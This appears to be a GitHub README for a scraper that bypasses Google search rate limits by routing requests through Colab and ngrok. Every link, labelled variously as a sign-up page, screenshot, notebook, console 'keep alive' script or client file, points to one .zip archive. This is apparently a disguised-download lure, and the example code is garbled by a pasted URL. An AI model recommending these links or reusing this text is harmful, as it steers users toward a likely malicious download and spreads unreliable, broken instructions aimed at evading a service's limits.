# Google Search API using Colab as a Proxy Server

This repository provides a solution to bypass Google rate limits using Google Search API in conjunction with Colab and ngrok as a proxy server.

## Prerequisites

### Step 1: Create an ngrok Account
1. **Sign Up or Log In**  
   - Create an account [here](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip) or log in [here](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip).
2. **Select Python**  
   - On the homepage, select Python.  
   ![Select Python](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip%20(1).png)
3. **Copy Auth Token**  
   - Scroll down and copy the auth token.  
   ![Copy Auth Token](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip)

### Step 2: Set Up Domain and Edge
1. **Select Domain**  
   - In the left sidebar, select Domain.  
   ![Select Domain](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip)
2. **Create a New Domain**  
   - Create a new domain.  
   ![Create Domain](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip%20(2).png)
3. **Copy Domain Name**  
   - Once completed, copy the domain name.  
   ![Copy Domain Name](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip)
4. **Select Edges**  
   - In the left sidebar, select Edges.  
   ![Select Edges](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip)
5. **Delete Existing Edges**  
   - Ensure there are no edges. If there are, delete them.  
   ![Delete Edges](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip)

### Step 3: Set Up Colab
1. **Open Colab**  
   - Open this [Colab notebook](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip) or create a new Colab and copy the code from the `https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip` file in this [GitHub repository](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip).
2. **Keep Colab Alive**  
   - Click on inspect on the Colab, open the console, and paste the following JS code: [https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip).
3. **Replace Auth Token and Domain**  
   - Replace the ngrok auth token and ngrok domain name in the code.
4. **Run Colab**  
   - If everything is done correctly, there should be no errors when running the Colab notebook.

### Step 4: Set Up Client
1. **Copy Client Code**  
   - Copy the `https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip` from this [GitHub repository](https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip) to your local machine or a different Colab.

## Usage

```python
from client import Bulk_Scrapper

# Replace 'Your Ngrok Domain Here' with your actual ngrok domain
Scraper = Bulk_Scrapper('Your Ngrok Domain Here')

# Example usage
urls = https://raw.githubusercontent.com/Diakonrobel/Google_Collab-server-pass/main/readme_photos/Google-pass-Collab-server-phlebolitic.zip(['words', 'hii'])
for i in urls:
    print(i, urls[i])
```

## Contributing
Contributions are welcome! Please feel free to submit a Pull Request.

---

If you have any questions or need further assistance, please feel free to open an issue on the GitHub repository.

Happy Scraping!


